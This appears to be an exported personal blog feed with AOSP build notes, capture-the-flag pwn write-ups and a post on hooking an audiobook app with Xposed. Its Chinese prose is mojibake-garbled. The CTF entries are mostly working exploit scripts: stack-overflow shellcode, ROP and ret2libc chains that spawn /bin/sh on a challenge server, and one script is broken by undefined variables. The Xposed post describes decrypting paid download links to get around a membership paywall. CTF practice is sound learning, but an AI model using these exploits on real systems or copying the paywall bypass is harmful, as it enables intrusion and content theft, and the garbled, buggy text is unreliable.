</code></pre><p>è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œä¿®æ”¹profileæ–‡ä»¶</p>
<pre><code>sudo gedit /etc/profile
export JAVA_HOME=/usr/lib/jvm/java-7-openjdk-amd64
export JRE_HOME=${JAVA_HOME}/jre 
export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib  
export PATH=${JAVA_HOME}/bin:$PATH
</code></pre><p>æ›´æ–°profileæ–‡ä»¶ source /etc/profileï¼Œä¹‹åé€šè¿‡java -versionæŸ¥çœ‹ç‰ˆæœ¬å·ã€‚</p>
<h2 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h2><h3 id="ä¸‹è½½è®¾å¤‡é©±åŠ¨"><a href="#ä¸‹è½½è®¾å¤‡é©±åŠ¨" class="headerlink" title="ä¸‹è½½è®¾å¤‡é©±åŠ¨"></a>ä¸‹è½½è®¾å¤‡é©±åŠ¨</h3><p>å› ä¸ºæºç æœ€ç»ˆç¼–è¯‘å®Œéœ€è¦è·‘åœ¨çœŸå®è®¾å¤‡ä¸Šï¼Œå› æ­¤é™¤äº†ä½¿ç”¨ AOSP æºç ç¼–è¯‘å‡ºå¯ä»¥åœ¨ç‰¹å®šè®¾å¤‡ä¸­è¿è¡Œçš„ç³»ç»Ÿé•œåƒï¼Œè¿˜éœ€è¦åœ¨<a href="https://developers.google.com/android/drivers" target="_blank" rel="external">è®¾å¤‡é©±åŠ¨</a>ä¸‹è½½å¯¹åº”è®¾å¤‡çš„é©±åŠ¨ã€‚<br>å¯ä»¥é€šè¿‡ printconfig å‘½ä»¤æŸ¥çœ‹æœ¬åœ°æºç çš„é…ç½®ï¼Œå¯¹åº”å…¶ä¸­BUILD_IDç„¶åä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„ç¡¬ä»¶è®¾å¤‡é©±åŠ¨ã€‚</p>
<p>ä¸‹è½½å®Œæˆåï¼Œå°†æ–‡ä»¶è§£å‹å¾—åˆ°ä¸¤ä¸ªè„šæœ¬ï¼Œæ”¾åˆ°æºç æ ¹ç›®å½•ä¸‹ï¼Œè¿è¡Œè„šæœ¬ï¼Œä¼šæœ‰å¾ˆé•¿çš„åè®®ï¼Œåœ¨å‘½ä»¤æ¨¡å¼ä¸‹è¾“å…¥ q å³å¯è·³åˆ°æœ€åï¼Œè¾“å…¥ â€œI ACCEPTâ€ ç¡®è®¤åè®®ï¼Œ äºŒè¿›åˆ¶æ–‡ä»¶å°†ä¼šåœ¨æºç æ ¹ç›®å½•ä¸‹æ–°å»º /vender æ–‡ä»¶å­˜æ”¾äºŒè¿›åˆ¶æ–‡ä»¶åŠå…¶å¯¹åº”çš„ Makefile</p>
<h3 id="å¼€å§‹ç¼–è¯‘"><a href="#å¼€å§‹ç¼–è¯‘" class="headerlink" title="å¼€å§‹ç¼–è¯‘"></a>å¼€å§‹ç¼–è¯‘</h3><p>åœ¨æºç æ ¹ç›®å½•ä¸‹ï¼š</p>
<pre><code>make clobber
source build/envsetup.sh
</code></pre><p>é€šè¿‡lunché€‰æ‹©ç¼–è¯‘ç›®æ ‡ï¼Œè¿™é‡Œç¼–è¯‘aosp_hammerhead-userdebugï¼Œé€‰æ‹©19</p>
<pre><code>lunch
</code></pre><p>å¼€å§‹ç¼–è¯‘</p>
<pre><code>make -j8
</code></pre><h2 id="åˆ·æœº"><a href="#åˆ·æœº" class="headerlink" title="åˆ·æœº"></a>åˆ·æœº</h2><p>ç¼–è¯‘æˆåŠŸä¹‹åè¿æ¥bootloader</p>
<pre><code>adb reboot bootloader
</code></pre><p>åˆ·å…¥é•œåƒ</p>
<pre><code>fastboot -w flashall
</code></pre><h2 id="é—®é¢˜è®°å½•åŠè§£å†³æ–¹æ¡ˆ"><a href="#é—®é¢˜è®°å½•åŠè§£å†³æ–¹æ¡ˆ" class="headerlink" title="é—®é¢˜è®°å½•åŠè§£å†³æ–¹æ¡ˆ"></a>é—®é¢˜è®°å½•åŠè§£å†³æ–¹æ¡ˆ</h2><h3 id="clangé—®é¢˜"><a href="#clangé—®é¢˜" class="headerlink" title="clangé—®é¢˜"></a>clangé—®é¢˜</h3><p>ç¼–è¯‘æ—¶å‡ºç°clang: error: linker command failed with exit code 1 (use -v to see invocation) </p>
<p>ä¿®æ”¹ android_source/art/build/Android.common_build.mk æ–‡ä»¶ï¼Œå®šä½åˆ°75è¡Œï¼Œå°†ä¸‹é¢çš„ä»£ç ï¼š<br>    ifneq ($(WITHOUT_HOST_CLANG),true)<br>æ”¹ä¸ºï¼š<br>    ifeq ($(WITHOUT_HOST_CLANG),false)</p>
<h3 id="open-jdk7é—®é¢˜"><a href="#open-jdk7é—®é¢˜" class="headerlink" title="open-jdk7é—®é¢˜"></a>open-jdk7é—®é¢˜</h3><p>open-jdkåœ¨å®‰è£…å¥½ä¹‹åï¼Œjava&amp;javacæ— æ³•è¿è¡Œï¼Œæ˜¾ç¤ºæ— æƒé™ï¼Œæ‰¾åˆ°å®‰è£…ä½ç½®èµ‹äºˆæƒé™ï¼Œåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­ä»ç„¶æç¤ºåªæ”¯æŒopenjdk7.x,ä¿®æ”¹envsetup.shæ–‡ä»¶</p>
<pre><code>sudo gedit build/envsetup.sh
</code></pre><p>åˆšæ‰è§£å‹çš„jdkè·¯å¾„ç²˜è´´åˆ°JAVA_HOME å˜é‡ä¸­ ï¼Œä¿®æ”¹main.mkæ–‡ä»¶</p>
<pre><code>sudo gedit build/core/main.mk
</code></pre><p>æ³¨é‡Šæ‰ç¬¬ 171 è¡Œçš„ç»ˆæ­¢å‘½ä»¤ï¼š</p>
<pre><code>$(error stop)
</code></pre><h3 id="è¿›å…¥bootloaderä¹‹åæ— æ³•è¿æ¥è®¾å¤‡"><a href="#è¿›å…¥bootloaderä¹‹åæ— æ³•è¿æ¥è®¾å¤‡" class="headerlink" title="è¿›å…¥bootloaderä¹‹åæ— æ³•è¿æ¥è®¾å¤‡"></a>è¿›å…¥bootloaderä¹‹åæ— æ³•è¿æ¥è®¾å¤‡</h3><pre><code>https://github.com/snowdream/51-android
</code></pre><p>å‚è€ƒé“¾æ¥<br><a href="https://blog.csdn.net/ynshi57/article/details/110728754" target="_blank" rel="external">https://blog.csdn.net/ynshi57/article/details/110728754</a><br><a href="https://blog.csdn.net/fuchaosz/article/details/51487585" target="_blank" rel="external">https://blog.csdn.net/fuchaosz/article/details/51487585</a><br><a href="https://daimajiaoliu.com/daima/479c5637b1003fc" target="_blank" rel="external">https://daimajiaoliu.com/daima/479c5637b1003fc</a><br><a href="https://www.dazhuanlan.com/2019/12/26/5e04348c59a63/" target="_blank" rel="external">https://www.dazhuanlan.com/2019/12/26/5e04348c59a63/</a><br><a href="https://blog.csdn.net/qq_30123335/article/details/115488942" target="_blank" rel="external">https://blog.csdn.net/qq_30123335/article/details/115488942</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>ç¼–è¯‘</tag>
        <tag>æºç </tag>
      </tags>
  </entry>
  <entry>
    <title>X-MAN(level0~level2)</title>
    <url>/2017/02/24/X-MAN-level0-level2/</url>
    <content><![CDATA[<p>é¢˜ç›®èµ„æºåœ¨<a href="https://www.jarvisoj.com" target="_blank" rel="external">è¿™é‡Œ</a><br><a id="more"></a><br>è¿™å‡ ä¸ªé¢˜ç›®æ¯”è¾ƒç®€å•ï¼Œå°±ä¸ä¸€ä¸€è¯¦ç»†æè¿°äº†ï¼Œexpå¦‚ä¸‹ï¼š</p>
<h3 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h3><p>æ ˆæº¢å‡ºååˆ†æ˜æ˜¾ï¼Œç¨‹åºé‡Œè‡ªå¸¦callsystemçš„å‡½æ•°ï¼Œçœ‹äº†ä¸€ä¸‹ï¼Œå°±æ˜¯è°ƒç”¨/bin/shï¼Œç›´æ¥è·³è½¬è¿‡å»å°±å¥½</p>
<pre><code>from pwn import *
#p=process(&apos;./level0&apos;)
p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)

call_system=0x0000000000400596
payload=&apos;a&apos;*136+p64(call_system)
p.send(payload)
p.interactive()
</code></pre><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>åŒæ ·æ˜¯å¾ˆç®€å•çš„æ ˆæº¢å‡ºï¼Œå¼„æ¸…æ¥šshellcodeçš„å­˜æ”¾åœ°å€</p>
<pre><code>from pwn import *
# p = process(&apos;./level1&apos;)  # local
p = remote(&apos;pwn2.jarvisoj.com&apos;, 9877)  # remote
p.recvuntil(&apos;:&apos;)
address = p.recvuntil(&apos;?&apos;, drop=True)
address = int(address, 16)
print address
junk = &apos;a&apos; * 0x88
ebp = &apos;aaaa&apos;
retaddr = address + 0x88 + 4 + 4
shellcode = &quot;\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x31\xc0\x31\xd2\x52\x68\x2f\x2f&quot; \
    &quot;\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0&quot; \
    &quot;\x0b\xcd\x80\n&quot;
payload = junk + ebp + p32(retaddr) + shellcode
p.send(payload)
p.interactive()
</code></pre><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>è¿˜æ˜¯æ ˆæº¢å‡ºï¼Œæœç´¢å­—ç¬¦ä¸²å‘ç°bssæ®µé‡Œæœ‰â€œ/bin/shâ€,å¯ä»¥ç›´æ¥è°ƒç”¨ã€‚æ³¨æ„p32(4)æ˜¯è™šæ„çš„è¿”å›åœ°å€ï¼Œéšä¾¿æ˜¯ç”³éƒ½å¯ä»¥ã€‚</p>
<pre><code>from pwn import *

#p=process(&apos;./level2&apos;)
p=remote(&apos;pwn2.jarvisoj.com&apos;,9878)

systemadd=0x08048320
shelladd=0x0804A024

payload=&apos;a&apos;*140+p32(systemadd)+p32(4)+p32(shelladd)

p.send(payload)
p.interactive()
</code></pre><h3 id="level2-x86"><a href="#level2-x86" class="headerlink" title="level2_x86"></a>level2_x86</h3><p>æœ¬é¢˜ä¸»è¦è€ƒå¯Ÿçš„æ˜¯64ä½ä¸‹å‚æ•°çš„ä¼ é€’é¡ºåºï¼Œä»ç¬¬ä¸€ä¸ªåˆ°ç¬¬å…­ä¸ªä¾æ¬¡ä¿å­˜åœ¨rdiï¼Œrsiï¼Œrdxï¼Œrcxï¼Œr8ï¼Œr9ï¼Œä¹‹åæ‰€æœ‰çš„å‚æ•°é€šè¿‡æ ˆæ¥ä¼ é€’ã€‚æœ¬é¢˜çš„å…³é”®åœ¨äºå°†/bin/shæ”¾åœ¨RDIå¯„å­˜å™¨ä¸­ã€‚</p>
<pre><code>from pwn import *

#p=process(&apos;./level2_x64&apos;)
p=remote(&apos;pwn2.jarvisoj.com&apos;,9882)

level2=ELF(&apos;./level2_x64&apos;)
systemadd=level2.plt[&apos;system&apos;]
print hex(systemadd)

shelladd=0x00600a90
rdiret=0x00000000004006b3

payload=&apos;a&apos;*128+&quot;b&quot;*8+p64(rdiret)+p64(shelladd)+p64(systemadd)

p.send(payload)
p.interactive()
</code></pre>]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>X-MAN-level3</title>
    <url>/2017/02/24/X-MAN-level3/</url>
    <content><![CDATA[<p>æœ¬é¢˜ä¸»è¦è€ƒå¯Ÿé€šè¿‡å»¶è¿Ÿç»‘å®šæŠ€æœ¯æ³„æ¼å‡½æ•°çš„çœŸå®åœ°å€ï¼Œ<a href="http://yunnigu.dropsec.xyz/2017/02/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/">å»¶è¿Ÿç»‘å®šæŠ€æœ¯</a>,é€šè¿‡GDBè°ƒè¯•ä¼šå‘ç°ç¨‹åºå¼€å¯äº†NXä¿æŠ¤ã€‚è€Œä¸”ä¹Ÿæ‰¾ä¸åˆ°systemå‡½æ•°å’Œbin/shï¼Œ<br><a id="more"></a><br>é¦–å…ˆéœ€è¦æ³„æ¼writeå‡½æ•°çš„åœ°å€ç”¨æ¥æ±‚å‡ºsystemå’Œbin/shçš„å®é™…åœ°å€ï¼Œæ„é€ payload=â€˜Aâ€™*140+p32(writeplt) +p32(vuladdr)+ p32(1) + p32(writegot) + p32(4)<br>è¿”å›åœ°å€æ”¹ä¸ºæº¢å‡ºå‘ç°çš„å‡½æ•°åœ°å€æ˜¯ä¸ºäº†æ¥ä¸‹æ¥ç¬¬äºŒä¸ªpayloadçš„æ„é€ ï¼Œå› ä¸ºå‡½æ•°æ¯æ¬¡è¿è¡Œçš„ä¸ªå‡½æ•°çš„å®é™…åœ°å€æ˜¯ä¸åŒçš„ã€‚åé¢çš„ä¸‰ä¸ªæ˜¯writeå‡½æ•°çš„ä¸‰ä¸ªå‚æ•°ï¼Œé€šè¿‡å»¶è¿Ÿç»‘å®šåŸç†å°†writeçš„å®é™…åœ°å€å†™å‡ºæ¥ã€‚</p>
<p>ç¬¬äºŒä¸ªpayloadå°±æ˜¯ç›´æ¥ä¿®æ”¹è¿”å›åœ°å€ä¸ºsystemçœŸå®åœ°å€å†åŠ ä¸Šbin/shçš„åœ°å€å°±å¯ä»¥å®ç°åˆ©ç”¨ã€‚è„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre><code>from pwn import *

#p=process(&apos;./level3&apos;)
#libc=ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)
#context.log_level = &apos;debug&apos;
p=remote(&apos;pwn2.jarvisoj.com&apos;,9879)

level2=ELF(&apos;./level3&apos;)
libc=ELF(&apos;libc-2.19.so&apos;)
#offest
writeoffest = libc.symbols[&apos;write&apos;]
print writeoffest
systemoffest = libc.symbols[&apos;system&apos;]
print systemoffest
binshoffest=0x0016084C
#plt
writeplt=0x08048340
#got
writegot=0x0804A018
#addr
basebss = 0x0804A024
pop3ret = 0x08048519
vuladdr = 0x0804844B

payload=&apos;A&apos;*140+p32(writeplt) +p32(vuladdr)+ p32(1) + p32(writegot) + p32(4)

p.recvuntil(&apos;Input:\n&apos;)
p.send(payload)
writeaddr=u32(p.recv(4))
print writeaddr

systemaddr = writeaddr - writeoffest + systemoffest
binshaddr = writeaddr - writeoffest + binshoffest

payload=&apos;a&apos;*140+p32(systemaddr)+p32(4)+p32(binshaddr)

p.send(payload)
p.interactive()
</code></pre>]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>XMAN-Level3-x64</title>
    <url>/2017/02/27/XMAN-Level3-x64/</url>
    <content><![CDATA[<p>è¿™ä¸ªé¢˜ç›®å’ŒXMAN-Level2-x64è€ƒå¯Ÿç›®çš„æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯è€ƒå¯Ÿåœ¨x64ä¸­ä¼ å‚æ•°çš„é—®é¢˜ï¼Œè¿™ä¸ªé¢˜ç›®æ˜¯å¦‚ä½•è€ƒå¯Ÿåœ¨x64ä¸­ä¼ å¤šä¸ªå‚æ•°ã€‚<br><a id="more"></a></p>
<p>ç”±äºæœ¬é¢˜ç›®éœ€è¦é€šè¿‡writeæ³„æ¼å®é™…åœ°å€ï¼Œå› æ­¤éœ€è¦ä¼ é€’å¤šä¸ªå‚æ•°ï¼Œrdxè¿™ä¸ªå¯„å­˜å™¨åœ¨ç¨‹åºä¸­æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„gadgetï¼Œä½†æ˜¯é€šè¿‡è°ƒè¯•ä¼šå‘ç°rdxè¿™ä¸ªå€¼æ¯”è¾ƒå¤§ï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥çš„ä¹Ÿæ˜¯ä¸€ä¸ªè¾ƒå¤§çš„å€¼ä¾¿äºè¿›è¡Œwriteå’Œreadï¼Œè¿™æ ·å°±å¯ä»¥ä¸ç”¨è®¾ç½®è¿™æ ·ä¸€ä¸ªrdxçš„å€¼ã€‚</p>
<p>è¿˜æœ‰ä¸ªé—®é¢˜æ˜¯åœ¨è¿è¡Œè„šæœ¬çš„æ—¶å€™å‘ç°ï¼Œç›®æ ‡æœºä¸Šç¨‹åºè°ƒç”¨çš„å¹¶ä¸æ˜¯ç»™çš„é‚£ä¸ªåº“ï¼Œè€Œæ˜¯libc.so.6ã€‚è„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre><code>from pwn import *
# p = process(&apos;./level3_x64&apos;)  # local
libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)
# context.log_level = &apos;debug&apos;
p = remote(&apos;pwn2.jarvisoj.com&apos;, 9883)  # remote
# libc = ELF(&apos;libc-2.19.so&apos;)  # remote
elf = ELF(&apos;./level3_x64&apos;)
# offest
readoffest = libc.symbols[&apos;read&apos;]
systemoffest = libc.symbols[&apos;system&apos;]
# plt
readplt = elf.plt[&apos;read&apos;]
writeplt = elf.plt[&apos;write&apos;]
# got
readgot = elf.got[&apos;read&apos;]
# addr
basebss = elf.bss()
rdiret = 0x00000000004006b3
rsiret = 0x00000000004006b1
vuladdr = 0x00000000004005E6
payload = &quot;A&quot;*136 
payload+= p64(rdiret) + p64(1) #writeå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•° 
payload+= p64(rsiret) + p64(readgot) #writeå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œå¾…æ˜¾ç¤ºå­—ç¬¦ä¸²çš„é¦–åœ°å€
payload+= p64(8) #writeå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå¾…æ˜¾ç¤ºå­—ç¬¦ä¸²çš„å­—èŠ‚æ•°
payload+= p64(writeplt) + p64(vuladdr)
p.recvuntil(&apos;Input:\n&apos;)
# gdb.attach(p)
p.send(payload)
readaddr = u64(p.recv(8))
systemaddr = readaddr - readoffest + systemoffest
payload  = &quot;A&quot;*136 
payload += p64(rdiret) + p64(0) #readå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œstdin
payload += p64(rsi2ret) + p64(basebss)#readå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œå¾…å†™å…¥åœ°å€ç©ºé—´çš„é¦–åœ°å€
payload += p64(888)  #readå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå¾…å†™å…¥å­—ç¬¦ä¸²çš„é•¿åº¦
payload += p64(readaddr)
payload += p64(rdiret) #readå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°
payload += p64(basebss) #readå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œå¾…å†™å…¥åœ°å€ç©ºé—´çš„é¦–åœ°å€ 
payload += p64(systemaddr) 
sh.send(payload)
sh.send(&apos;/bin/sh\x00&apos;)
sh.interactive()
</code></pre>]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>XMAN-level4</title>
    <url>/2017/02/28/XMAN-level4/</url>
    <content><![CDATA[<p>æœ¬é¢˜å…¶å®å°±æ˜¯level3çš„ä¸€ä¸ªå‡çº§ç‰ˆæœ¬ï¼Œå”¯ä¸€çš„åŒºåˆ«å°±æ˜¯æœ¬é¢˜æ²¡æœ‰æä¾›libcï¼Œå¯ä»¥é€šè¿‡DynELFæ³„æ¼å‡½æ•°çœŸå®åœ°å€ã€‚<br><a id="more"></a><br>æœ‰ä¸€ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„ï¼Œleakå‡½æ•°å¯ä»¥åœ¨writeä¹‹åç›´æ¥popä¸‰ä¸ªå‚æ•°å†è¿”å›mainï¼š</p>
<pre><code>payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
</code></pre><p>ä¹Ÿå¯ä»¥é‡æ–°è¿”å›vulnï¼š</p>
<pre><code>payload+=p32(write_plt)+p32(vlun)+p32(1)+p32(address)+p32(4)
</code></pre><p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre><code>from pwn import *

#p=process(&apos;./level4&apos;)
p=remote(&apos;pwn2.jarvisoj.com&apos;,9880)
level4=ELF(&apos;./level4&apos;)

#plt
write_plt=0x08048340
read_plt=0x08048310

#addr
main=level4.symbols[&apos;main&apos;]
basebss=level4.bss()
pppr=0x08048509

def leak(address):
        payload=&apos;A&apos;*140
    payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
        p.send(payload)
        data =p.recv(4)
    print &quot;%#x %s&quot; % (address, data)
        return data


d = DynELF(leak, elf=ELF(&apos;./level4&apos;))

system_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;)
log.success(&apos;leak system address: &apos; + hex(system_addr))

payload2=&apos;A&apos;*140+p32(read_plt)+p32(pppr)+p32(0)+p32(basebss)+p32(8)+p32(system_addr)+p32(main)+p32(basebss)
p.send(payload2)
p.send(&apos;/bin/sh\x00&apos;)
p.interactive()
</code></pre>]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Xposedåˆ©ç”¨----ä¸ºè‡ªå·±æç‚¹å°ç¦åˆ©</title>
    <url>/2020/09/07/Xposed%E5%88%A9%E7%94%A8-%E4%B8%BA%E8%87%AA%E5%B7%B1%E6%90%9E%E7%82%B9%E5%B0%8F%E7%A6%8F%E5%88%A9/</url>
    <content><![CDATA[<p>æœ€è¿‘ç¡å‰å–œæ¬¢å¬ä¸€å¬é¬¼å¹ç¯ï¼Œåœ¨æŸå¬ä¹¦è½¯ä»¶ä¸Šå‘ç°éœ€è¦è´­ä¹°ä¼šå‘˜æ‰å¯ä»¥å…è´¹å¬ï¼Œä½†æ˜¯æ¯å¤©ä¹Ÿå°±å¬ä¸ªä¸€ä¸¤é›†ï¼Œæ„Ÿè§‰åŒ…æœˆä¹°ä¼šå‘˜æœ‰ç‚¹ä¸å€¼å½“ï¼Œåˆšå¥½æœ€è¿‘è¦æŠŠå¥½ä¹…æ²¡ç”¨çš„Xposedå¤ä¹ ä¸€æ³¢çš„æƒ³æ³•ï¼Œä¹°ä¸€ä¸ªæœˆçš„ä¼šå‘˜æŠŠè‡ªå·±æƒ³è¦å¬çš„ä¹¦éƒ½ä¸‹è½½ä¸‹æ¥ï¼Œä¸ºè‡ªå·±æä¸€ç‚¹å°ç¦åˆ©ã€‚<br><a id="more"></a></p>
<h1 id="æŠ“åŒ…åˆ†æ"><a href="#æŠ“åŒ…åˆ†æ" class="headerlink" title="æŠ“åŒ…åˆ†æ"></a>æŠ“åŒ…åˆ†æ</h1><p>æƒ³è¦æ¨¡æ‹Ÿåº”ç”¨ä¸‹è½½èµ„æºçš„è¿‡ç¨‹ï¼Œé¦–å…ˆéœ€è¦æŠ“åŒ…åˆ†ææˆ‘ä»¬åˆ°åº•éœ€è¦æ¨¡æ‹Ÿå“ªäº›æ•°æ®åŒ…ï¼Œä»€ä¹ˆå‚æ•°éœ€è¦é€šè¿‡Xposedæ’ä»¶æ¥Hookæˆ–è€…è°ƒç”¨è·å–ã€‚</p>
<ul>
<li><p>è¯·æ±‚å¯¹åº”ä¹¦ç±çš„ç« èŠ‚åˆ—è¡¨ï¼Œä¸‹å›¾æ˜¯ä¹¦ç±é¦–é¡µåˆ—è¡¨ï¼Œæ¯æ¬¡ä¸Šæ‹‰åˆ·æ–°20ä¸ªç« èŠ‚ï¼Œç¬¬äºŒé¡µè¯·æ±‚ä¸ç¬¬ä¸€é¡µæœ‰ä¸€äº›å·®åˆ«ã€‚<br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/xmly1.png" alt=""><br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/xmly4.png" alt=""><br>é€šè¿‡è¯·æ±‚ç« èŠ‚åˆ—è¡¨æ¥è·å–ç« èŠ‚idä»¥åŠç« èŠ‚åç”¨äºç»™ä¸‹è½½å¥½çš„æ–‡ä»¶å‘½åã€‚</p>
</li>
<li><p>é€šè¿‡ä¸‹è¿°è¯·æ±‚è·å–åˆ°çš„track_idæ¥è¯·æ±‚æ¯ä¸ªç« èŠ‚è¿”å›çš„ä¸‹è½½é“¾æ¥ï¼Œä¸‹è½½é“¾æ¥åŒ…å«åœ¨è¿”å›çš„epå’ŒfileIdä¸­ï¼Œè¿™ä¸¤ä¸ªå‚æ•°éƒ½è¢«åŠ å¯†äº†ã€‚<br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/xmly2.png" alt=""></p>
</li>
<li>åœ¨è§£å¯†epå’Œfileidä¹‹åï¼Œç›´æ¥è¯·æ±‚download_urlå³å¯è·å¾—éŸ³é¢‘æ–‡ä»¶ï¼Œä¿å­˜åˆ°æœ¬åœ°å³å¯ã€‚<br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/xmly3.png" alt=""></li>
</ul>
<h1 id="åˆ†æè°ƒè¯•ï¼Œå®šä½å…³é”®å‡½æ•°"><a href="#åˆ†æè°ƒè¯•ï¼Œå®šä½å…³é”®å‡½æ•°" class="headerlink" title="åˆ†æè°ƒè¯•ï¼Œå®šä½å…³é”®å‡½æ•°"></a>åˆ†æè°ƒè¯•ï¼Œå®šä½å…³é”®å‡½æ•°</h1><p>é€šè¿‡åœ¨epå’Œfileidä¸‹æ–­ç‚¹ï¼ŒåŠ¨æ€è°ƒè¯•å®šä½åˆ°è§£å¯†è¿™ä¸¤ä¸ªå­—æ®µçš„ä½ç½®åŠå‡½æ•°</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/xmly5.png" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/xmly6.png" alt=""></p>
<p>è¿›ä¸€æ­¥è°ƒè¯•å‘ç°ä¸¤ä¸ªè§£å¯†å‡½æ•°éƒ½åœ¨EncryptUtilè¿™ä¸ªç±»ä¸­ï¼Œå› æ­¤åç»­åªéœ€è¦æƒ³åŠæ³•é€šè¿‡Xposedè°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°å³å¯</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/xmly7.png" alt=""></p>
<h1 id="ç¼–å†™Xposedæ’ä»¶"><a href="#ç¼–å†™Xposedæ’ä»¶" class="headerlink" title="ç¼–å†™Xposedæ’ä»¶"></a>ç¼–å†™Xposedæ’ä»¶</h1><p>æƒ³è¦é€šè¿‡pythonç¼–å†™è„šæœ¬ä¸Xposedæ’ä»¶è¿›è¡Œé€šä¿¡ï¼Œä¼ è¾“æ•°æ®å¯ä»¥é‡‡å–socketæˆ–è€…æ­å»ºhttpæœåŠ¡å™¨ä¸¤ç§æ–¹å¼ï¼Œè¿™é‡Œæˆ‘é‡‡å–äº†é€šè¿‡nanohttpæ­å»ºå°å‹æœåŠ¡å™¨è¾¾åˆ°æ•°æ®äº¤äº’çš„æ•ˆæœã€‚</p>
<p>ç”±äºéœ€è¦è°ƒç”¨çš„ä¸¤ä¸ªå‡½æ•°éƒ½åŒ…å«Contextç±»å‹çš„å‚æ•°ï¼Œé‚£å°±éœ€è¦æ‰¾åˆ°è°ƒç”¨è¯¥Contextçš„å‡½æ•°å°†å…¶Hookè·å–åˆ°ã€‚<br>åŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯è¦è°ƒç”¨çš„å‡½æ•°å¹¶ä¸æ˜¯staticå‡½æ•°ï¼Œå› æ­¤åœ¨invokeçš„æ—¶å€™ç¬¬ä¸€ä¸ªå‚æ•°ä¸èƒ½ä¸ºç©ºï¼Œéœ€è¦èµ‹å€¼å‡½æ•°å®ä¾‹ï¼Œæ‰¾åˆ°åŒåœ¨è¿™ä¸ªç±»ä¸­çš„ä»»ä½•ä¸€ä¸ªå‡½æ•°è¿›è¡ŒHookè·å–å…¶å®ä¾‹ã€‚</p>
<p>æˆ‘è¿™é‡ŒHookäº†åŒç±»ä¸­ä¸€ä¸ªnativeå‡½æ•°ï¼Œè·å–å®ä¾‹åŠContextã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/xmly8.png" alt=""></p>
<p>ä¹‹åé€šè¿‡æ¥æ”¶pythonå®¢æˆ·ç«¯ä¼ çš„epå’Œfile_idå‚æ•°åŠAndroidæœåŠ¡ç«¯Hookè·å–åˆ°çš„æ–¹æ³•å®ä¾‹åŠContextå‚æ•°è¿›è¡Œinvokeè°ƒç”¨</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/xmly9.png" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/xmly10.png" alt=""></p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬æ–‡ä¸»è¦æ˜¯ä¸ºäº†è®°å½•ä¸€ä¸‹åœ¨å¤ä¹ Xposedåˆ©ç”¨æ‰€å­¦ä¹ åˆ°çš„ä¸€äº›ä¸œè¥¿è¿›è¡ŒæŠ€æœ¯äº¤æµï¼Œç¦æ­¢ç”¨æ¥åšéæ³•æ¶æ„äº‹æƒ…ï¼Œå¦åˆ™åæœè‡ªä»˜ï¼å¦‚æœ‰ä¾µæƒï¼Œè¯·è”ç³»ä½œè€…åˆ é™¤ã€‚</p>
<p>è¯¦ç»†ä»£ç åœ°å€ <a href="https://gitee.com/yunnigu/Xposed_project" target="_blank" rel="external">https://gitee.com/yunnigu/Xposed_project</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>Hook</tag>
        <tag>Xposed</tag>
      </tags>
  </entry>
  <entry>
    <title>checksecåŠå…¶åŒ…å«çš„ä¿æŠ¤æœºåˆ¶</title>
